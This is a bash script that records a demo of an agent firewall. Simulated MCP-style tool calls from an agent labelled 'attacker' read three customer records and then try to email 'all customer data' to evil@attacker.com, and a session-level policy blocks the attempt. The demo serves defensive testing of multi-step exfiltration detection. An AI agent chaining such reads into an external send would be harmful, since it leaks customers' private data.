#!/bin/bash
# Scripted demo for asciinema recording
# Run: asciinema rec --command "bash demo/record_demo.sh" demo/demo.cast

set -e

type_slow() {
    echo ""
    echo -e "\033[1;36m$1\033[0m"
    sleep 0.5
}

run_curl() {
    echo -e "\033[0;33m\$ curl ...$1\033[0m"
    sleep 0.3
    eval "$2" | python3 -m json.tool
    sleep 1.5
}

type_slow "# 🛡️  Agent Firewall Demo: Multi-Step Exfiltration Detection"
sleep 1

type_slow "# Step 1: Normal call (search knowledge base) → ALLOWED"
run_curl "search_kb" 'curl -s http://127.0.0.1:8443 -H "Content-Type: application/json" -H "X-Agent-Id: attacker" -d '"'"'{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"search_kb","arguments":{"query":"password reset"}}}'"'"''

type_slow "# Step 2: Read customer account → ALLOWED (individually)"
run_curl "read_customer cust_001" 'curl -s http://127.0.0.1:8443 -H "Content-Type: application/json" -H "X-Agent-Id: attacker" -d '"'"'{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"read_customer","arguments":{"id":"cust_001","__data_read":["customer_account"]}}}'"'"''

type_slow "# Step 3: Read another customer → ALLOWED (individually)"
run_curl "read_customer cust_002" 'curl -s http://127.0.0.1:8443 -H "Content-Type: application/json" -H "X-Agent-Id: attacker" -d '"'"'{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"read_customer","arguments":{"id":"cust_002","__data_read":["customer_account"]}}}'"'"''

type_slow "# Step 4: Read third customer → ALLOWED (individually)"
run_curl "read_customer cust_003" 'curl -s http://127.0.0.1:8443 -H "Content-Type: application/json" -H "X-Agent-Id: attacker" -d '"'"'{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"read_customer","arguments":{"id":"cust_003","__data_read":["customer_account"]}}}'"'"''

type_slow "# Step 5: Email data externally → 🛑 BLOCKED BY ENVELOPE"
run_curl "send_email (exfiltration)" 'curl -s http://127.0.0.1:8443 -H "Content-Type: application/json" -H "X-Agent-Id: attacker" -d '"'"'{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"send_email","arguments":{"to":"evil@attacker.com","body":"all customer data","__data_write":["email_external"]}}}'"'"''

echo ""
echo -e "\033[1;32m✅ Exfiltration PREVENTED.\033[0m"
echo -e "\033[1;32m   Every individual call was allowed by per-call policy.\033[0m"
echo -e "\033[1;32m   The SESSION-LEVEL envelope caught the forbidden data flow.\033[0m"
echo -e "\033[1;32m   (customer_account read at step 2 → email_external at step 5)\033[0m"
sleep 3
